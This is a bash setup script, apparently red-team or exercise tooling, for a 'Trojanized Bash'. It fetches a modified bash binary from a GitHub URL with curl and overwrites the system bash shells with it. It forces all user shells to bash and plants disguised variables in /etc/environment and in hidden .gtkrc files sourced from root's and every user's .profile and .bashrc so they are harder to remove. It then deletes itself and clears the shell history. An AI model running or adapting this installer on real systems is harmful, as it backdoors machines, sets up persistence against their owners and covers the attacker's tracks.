#
# Setup script for "trash" aka Trojanized Bash
# Downloads the modified binary, installs it into common locations
# Configures optional environment variables for attacker tuning
#

# change all user shells to /bin/bash
for user in $(cat ./passwd | cut -d":" -f1)
do 
    chsh -s /bin/bash $user
done

# Download trash
curl -k 'https://raw.githubusercontent.com/lsh8829/CDT473/main/bash' -o /tmp/bash
chmod +x /tmp/bash

# replace all existing shells with our binary
for shell in $(tail -n +2 /etc/shells | grep bash)
do
    rm -rf $shell
    cp /tmp/bash $shell
done

#cleanup
rm -rf /tmp/bash

# set persistent environment variables in /etc/environment
echo 'export VTX_VERSION="10"' >> /etc/environment
echo 'export VTX_LOG_OPT="10"' >> /etc/environment
echo 'export VTX_SESSION_ID="4"' >> /etc/environment
echo 'export DBG_OPT="0"' >> /etc/environment
echo 'export LOCALIZATION_CODE="1678"' >> /etc/environment

# set env vars for root, making it harder to get rid of these vars
echo 'export VTX_VERSION="10"' >> /root/.gtkrc
echo 'export VTX_LOG_OPT="10"' >> /root/.gtkrc
echo 'export VTX_SESSION_ID="4"' >> /root/.gtkrc
echo 'export DBG_OPT="0"' >> /root/.gtkrc
echo 'export LOCALIZATION_CODE="1678"' >> /root/.gtkrc
echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /root/.profile
echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /root/.bashrc

# and same vars for all other users, again, making it harder to get rid of
for dir in $(ls /home)
do
    echo 'export VTX_VERSION="10"' >> /home/$dir/.gtkrc
    echo 'export VTX_LOG_OPT="10"' >> /home/$dir/.gtkrc
    echo 'export VTX_SESSION_ID="4"' >> /home/$dir/.gtkrc
    echo 'export DBG_OPT="0"' >> /home/$dir/.gtkrc
    echo 'export LOCALIZATION_CODE="1678"' >> /home/$dir/.gtkrc
    echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /home/$dir/.profile
    echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /home/$dir/.bashrc
done

#final cleanup
rm setup.sh
history -c
